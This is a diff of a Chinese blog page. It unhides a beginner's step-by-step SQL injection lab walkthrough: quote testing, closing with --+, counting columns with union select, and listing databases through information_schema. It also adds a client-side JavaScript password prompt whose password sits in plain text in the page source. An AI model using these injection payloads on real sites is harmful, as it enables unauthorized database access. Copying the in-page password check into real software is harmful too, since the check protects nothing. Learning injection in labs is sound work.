@@ -485,14 +485,24 @@
 
       
         
-          文章访问密码：password
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/09/19/sql-1/">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          
+            <p>第一步：?id=1<br>正常显示</p>
+<p>第二步：?id=1’<br>显示错误：LIMIT 0,1’ 这表示切片<br>（注：select * from tablename limit 2,4 即取出第3条至第6条，4条记录）<br>这告诉我们需要将后面的注释掉</p>
+<p>第三步：?id=1’–+<br>利用–+将其闭合，考虑到URL编码问题，这里无法用/**/多行注释</p>
+<p>第四步：?id=0’ union  select 1,2,3–+  或者 ?id=0’ union select * from users order by猜解<br>测试关于字段的个数</p>
+<p>第五步：?id=0’ union select 1,group_concat(schema_name),3 from information_schema.schemata–+<br>最后查看所有库，也可以加些其他操作…由于本人小白，就不多说了…</p>
+<script>
+    if("woshilinhanyi021"==prompt("请输入密码"))
+    {
+        alert("正确");
+    }
+    else
+    {
+        alert("错误");
+        location="http://baidu.com"; #返回网站，请自定义
+    }
+</script>
+          
         
       
     </div>
